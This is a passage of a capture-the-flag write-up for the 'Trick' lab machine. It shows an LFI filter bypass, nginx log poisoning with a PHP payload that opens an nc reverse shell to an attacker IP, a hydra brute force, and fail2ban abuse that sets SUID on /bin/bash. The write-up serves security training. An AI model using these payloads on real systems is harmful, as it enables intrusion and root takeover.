</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112220857.png" src="img/pasted-image-20251112220857.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112220857.png" src="img/pasted-image-20251112220857.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Finally, the records were retrieved, revealing only one user: the <code>Administrator</code>, whose username is <code>Enemigosss</code> and whose password is <code>SuperGucciRainbowCake</code>. This password could be interesting if it is reused for any other service. Concluding the <code>SQLi</code>, there is another way to obtain all the users and their passwords in the web application:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Displaying the Administrator's Password by Manipulating the HTML Code" dir="auto" class="heading" id="TCP_Port_80_Displaying_the_Administrator's_Password_by_Manipulating_the_HTML_Code_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Displaying the Administrator's Password by Manipulating the HTML Code</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112134238.png" src="img/pasted-image-20251112134238.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112134238.png" src="img/pasted-image-20251112134238.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">There is a <code>Users</code> tab that was inspected and contained all users. In this case, because only the <code>administrator</code> exists, the <code>administrator</code> is the only user shown. There is an action button that allows editing the user's information, and it displays the following:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112134252.png" src="img/pasted-image-20251112134252.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112134252.png" src="img/pasted-image-20251112134252.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Among the information, a password field can be seen that is not legible; however, this is simple <code>HTML</code> and can be modified using the browser's <code>inspector</code> to view the value:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112134331.png" src="img/pasted-image-20251112134331.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112134331.png" src="img/pasted-image-20251112134331.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the password field's <code>type</code> attribute was removed, the password became visible, displayed in clear text, the same one obtained previously by the <code>SQLi</code>. Concluding the enumeration of this <code>subdomain</code>, the credentials will be stored in a local file:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112134359.png" src="img/pasted-image-20251112134359.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112134359.png" src="img/pasted-image-20251112134359.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once stored, there was apparently nothing more to enumerate in the web service. However, rather than finish there, and knowing that the previous <code>subdomain</code> indicated a <code>pre‚Äëproduction</code> environment, there could be more subdomains in that environment; they will be checked</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Subdomain Enumeration Using `wfuzz`" dir="auto" class="heading" id="TCP_Port_80_Subdomain_Enumeration_Using_`wfuzz`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Subdomain Enumeration Using <code>wfuzz</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">wfuzz <span class="token parameter variable">-u</span> <span class="token string">'http://trick.htb'</span> <span class="token parameter variable">-H</span> <span class="token string">'Host: preprod-FUZZ.trick.htb'</span> <span class="token parameter variable">-w</span> /home/krmena/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="token parameter variable">-t</span> <span class="token number">200</span> <span class="token parameter variable">--hh</span><span class="token operator">=</span><span class="token number">5480,173</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112134934.png" src="img/pasted-image-20251112134934.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112134934.png" src="img/pasted-image-20251112134934.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Upon finishing the subdomain enumeration, another subdomain called <code>preprod-marketing</code> was discovered. It will be added to <code>/etc/hosts</code> to make the local machine resolve the <code>subdomain</code> to the correct IP address and load all web resources properly:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112135025.png" src="img/pasted-image-20251112135025.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112135025.png" src="img/pasted-image-20251112135025.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once added, the website can be enumerated as follows:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112135127.png" src="img/pasted-image-20251112135127.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112135127.png" src="img/pasted-image-20251112135127.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Upon entering the website, when tabs such as the <code>Services</code> tab were selected, the <code>URL</code> appeared potentially vulnerable to <code>LFI</code> because it uses a <code>page</code> parameter to reference local files. If this parameter is not properly sanitized, it could be used to point to local files. This will be checked:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112135146.png" src="img/pasted-image-20251112135146.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112135146.png" src="img/pasted-image-20251112135146.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Apparently the payload did not work and the contents of the local file <code>/etc/passwd</code> were not retrieved. Before concluding this <code>LFI</code> attempt, another one will be performed using the typical <code>....//....//</code> <code>payload</code> to bypass simple sanitizations that remove <code>../</code>. If a regex is applied to remove only that pattern and the user supplies <code>....//</code>, the result of removing that pattern is <code>../ - ....// = ../</code>, so the local file would be accessible. This will be tested below:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Local File Inclusion (LFI) via Bypassing the `../` Removal Pattern" dir="auto" class="heading" id="TCP_Port_80_Local_File_Inclusion_(LFI)_via_Bypassing_the_`../`_Removal_Pattern_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Local File Inclusion (LFI) via Bypassing the <code>../</code> Removal Pattern</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd'</span> --path-as-is
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112135340.png" src="img/pasted-image-20251112135340.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112135340.png" src="img/pasted-image-20251112135340.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">And, effectively, the <code>payload</code> worked, retrieving the contents of the local file <code>/etc/passwd</code>. Another command to filter only users with <code>/bin/bash</code> assigned will be performed:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd'</span> --path-as-is <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">bash</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112135409.png" src="img/pasted-image-20251112135409.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112135409.png" src="img/pasted-image-20251112135409.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The results showed only the users <code>root</code> and <code>michael</code> (who was previously identified through <code>SMTP</code> user enumeration). Now, having an <code>LFI</code> that can access local files on the target machine, an attempt could be made to obtain the <code>id_rsa</code> for the user <code>michael</code>. Instead, a <code>Log Poisoning attack</code> will be attempted:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: LFI to RCE - Nginx Log Poisoning" dir="auto" class="heading" id="TCP_Port_80_LFI_to_RCE_-_Nginx_Log_Poisoning_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: LFI to RCE - Nginx Log Poisoning</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112135757.png" src="img/pasted-image-20251112135757.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112135757.png" src="img/pasted-image-20251112135757.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To begin, it is important to remember that the web application server is an <code>Nginx</code> server. The attack will consist of determining whether the <code>Nginx</code> logs can be displayed by the web service using the <code>LFI</code>, and, given that it executes <code>PHP</code> code, making a special request that modifies the <code>User-Agent</code> header to include a malicious <code>PHP payload</code> intended to execute commands or establish a <code>reverse shell</code> connection. First, it must be checked whether <code>/var/log/nginx/access.log</code> can be accessed:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/log/nginx/access.log'</span> --path-as-is
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112140833.png" src="img/pasted-image-20251112140833.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112140833.png" src="img/pasted-image-20251112140833.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The log file was successfully displayed. Therefore, the malicious <code>PHP payload</code> to inject a <code>reverse shell</code> command will be sent by manipulating the <code>User-Agent</code> header:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/log/nginx/access.log'</span> <span class="token parameter variable">-H</span> <span class="token string">"User-Agent: &lt;?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.6 4444 &gt;/tmp/f');?&gt;"</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112142356.png" src="img/pasted-image-20251112142356.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112142356.png" src="img/pasted-image-20251112142356.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>HTTP</code> request was successfully sent, so now the log file contains this <code>PHP</code> code: <code>&lt;?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.6 4444 &gt;/tmp/f');?&gt;</code>. If the content of this log file is displayed again, the code will be executed by the web service, sending a <code>reverse shell</code> connection to the attacker's machine. This is shown below:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/log/nginx/access.log'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112142502.png" src="img/pasted-image-20251112142502.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112142502.png" src="img/pasted-image-20251112142502.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Finally, the attack worked and the <code>reverse shell</code> connection was successfully established. Beginning the <code>post‚Äëexploitation</code> stage, the system will be enumerated to find attack vectors with the goal of reaching the <code>root</code> account:</p></div><div class="el-h1"><h1 data-heading="Post-Exploitation" dir="auto" class="heading" id="Post-Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Post-Exploitation</h1></div><div class="el-h2"><h2 data-heading="User Flag" dir="auto" class="heading" id="User_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>User Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112142547.png" src="img/pasted-image-20251112142547.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112142547.png" src="img/pasted-image-20251112142547.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">First, the user flag was displayed. To begin the system enumeration, it will be checked whether the user <code>michael</code> has sudo privileges associated.</p></div><div class="el-h2"><h2 data-heading="Privilege Escalation" dir="auto" class="heading" id="Privilege_Escalation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Privilege Escalation</h2></div><div class="el-h3"><h3 data-heading="Abusing Sudoers Privileges by Modifying ``fail2ban`` Actionban Setting" dir="auto" class="heading" id="Abusing_Sudoers_Privileges_by_Modifying_``fail2ban``_Actionban_Setting_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Abusing Sudoers Privileges by Modifying <code>fail2ban</code> Actionban Setting</h3></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">sudo</span> <span class="token parameter variable">-l</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112142615.png" src="img/pasted-image-20251112142615.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112142615.png" src="img/pasted-image-20251112142615.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the <code>sudo</code> privileges were listed, it showed the user <code>michael</code> can execute the <code>/etc/init.d/fail2ban</code> program but only the <code>restart</code> function. Research into this program found that it is used to block unusual traffic, such as multiple failed <code>SSH</code> login attempts, and that the ban action for this program is commonly defined in <code>/etc/fail2ban/action.d/iptables-multiport.conf</code>. The attack vector would be to edit this file and replace the <code>actionban</code> action with another command (for example, one that grants <code>SUID</code> to <code>/bin/bash</code>), and then apply the configuration by executing the <code>restart</code> function. Finally, by performing a <code>brute‚Äëforce SSH attack</code> that triggers the ban action, a privileged <code>shell</code> could be obtained. There is a problem: the file is <code>non‚Äëwritable</code> by default for other users, but it can be copied and edited, the original renamed, and the edited file moved to the original path; after that, the configuration can be applied normally. This process is shown below:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">cp</span> action.d/iptables-multiport.conf /tmp/iptables-multiport.conf
<span class="token function">nano</span> /tmp/iptables-multiport.conf
<span class="token function">cat</span> /tmp/iptables-multiport.conf <span class="token operator">|</span> <span class="token function">grep</span> actionban
<span class="token function">mv</span> action.d/iptables-multiport.conf acton.d/iptables-multiport.bak
<span class="token function">mv</span> /tmp/iptables-multiport.conf action.d/iptables-multiport.conf
<span class="token function">cat</span> action.d/iptables-multiport.conf <span class="token operator">|</span> <span class="token function">grep</span> actionban
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112145017.png" src="img/pasted-image-20251112145017.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112145017.png" src="img/pasted-image-20251112145017.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the <code>actionban</code> in <code>iptables-multiport.conf</code> was edited, an <code>SSH brute‚Äëforce attack</code> can be performed to trigger the action and grant <code>SUID</code> privileges to <code>/bin/bash</code>.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">sudo</span> /etc/init.d/fail2ban restart
hydra <span class="token parameter variable">-l</span> <span class="token string">'michael'</span> <span class="token parameter variable">-P</span> /usr/share/wordlists/rockyou.txt ssh://10.10.11.166 <span class="token parameter variable">-t</span> <span class="token number">64</span> <span class="token parameter variable">-I</span>
<span class="token function">ls</span> <span class="token parameter variable">-l</span> /bin/bash
<span class="token function">bash</span> <span class="token parameter variable">-p</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112145216.png" src="img/pasted-image-20251112145216.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112145216.png" src="img/pasted-image-20251112145216.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the attack was executed, the <code>actionban</code> triggered and <code>/bin/bash</code> became <code>SUID</code>, which allowed a privileged <code>bash</code> to be obtained as <code>root</code>. Finally, the <code>root</code> flag will be displayed:</p></div><div class="el-h2"><h2 data-heading="Root Flag" dir="auto" class="heading" id="Root_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Root Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112145417.png" src="img/pasted-image-20251112145417.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112145417.png" src="img/pasted-image-20251112145417.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Finally, the target machine was successfully pwned!!</p></div><div class="el-h1"><h1 data-heading="References" dir="auto" class="heading" id="References_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>References</h1></div><div class="el-p"><p dir="auto"><strong>Fail2ban Privilege Escalation</strong> -&gt; <a data-tooltip-position="top" aria-label="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7" rel="noopener nofollow" class="external-link is-unresolved" href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7" target="_self">Link</a></p></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-trick.html#Machine_Trick_0" data-path="#Machine_Trick_0"><div class="tree-item-inner heading-link" heading-name="Machine Trick">Machine Trick</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-trick.html#Information_Gathering_0" data-path="#Information_Gathering_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Information Gathering">Information Gathering</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#Discovering_OS_via_TTL_Using_`ping`_0" data-path="#Discovering_OS_via_TTL_Using_`ping`_0"><div class="tree-item-inner heading-link" heading-name="Discovering OS via TTL Using `ping`">Discovering OS via TTL Using <code>ping</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#UDP_Port_Scan_Using_`nmap`_0" data-path="#UDP_Port_Scan_Using_`nmap`_0"><div class="tree-item-inner heading-link" heading-name="UDP Port Scan Using `nmap`">UDP Port Scan Using <code>nmap</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0" data-path="#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)">TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0" data-path="#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><div class="tree-item-inner heading-link" heading-name="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)">Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0" data-path="#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><div class="tree-item-inner heading-link" heading-name="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)">Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0" data-path="#TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Identifying Technologies and Services on the Web Service Using `whatweb` &amp; `wappalyzer`">TCP Port 80: Identifying Technologies and Services on the Web Service Using <code>whatweb</code> &amp; <code>wappalyzer</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_Source_Code_Inspection_0" data-path="#TCP_Port_80_Source_Code_Inspection_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Source Code Inspection">TCP Port 80: Source Code Inspection</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP/UDP_Port_53_DNS_Enumeration_Using_`nslookup`_&amp;_`dig`_0" data-path="#TCP/UDP_Port_53_DNS_Enumeration_Using_`nslookup`_&amp;_`dig`_0"><div class="tree-item-inner heading-link" heading-name="TCP/UDP Port 53: DNS Enumeration Using `nslookup` &amp; `dig`">TCP/UDP Port 53: DNS Enumeration Using <code>nslookup</code> &amp; <code>dig</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP/UDP_Port_53_DNS_Zone_Transfer_Attack_0" data-path="#TCP/UDP_Port_53_DNS_Zone_Transfer_Attack_0"><div class="tree-item-inner heading-link" heading-name="TCP/UDP Port 53: DNS Zone Transfer Attack">TCP/UDP Port 53: DNS Zone Transfer Attack</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_25_SMTP_User_Enumeration_via_Manual_Bash_Script_0" data-path="#TCP_Port_25_SMTP_User_Enumeration_via_Manual_Bash_Script_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 25: SMTP User Enumeration via Manual Bash Script">TCP Port 25: SMTP User Enumeration via Manual Bash Script</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-trick.html#TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0" 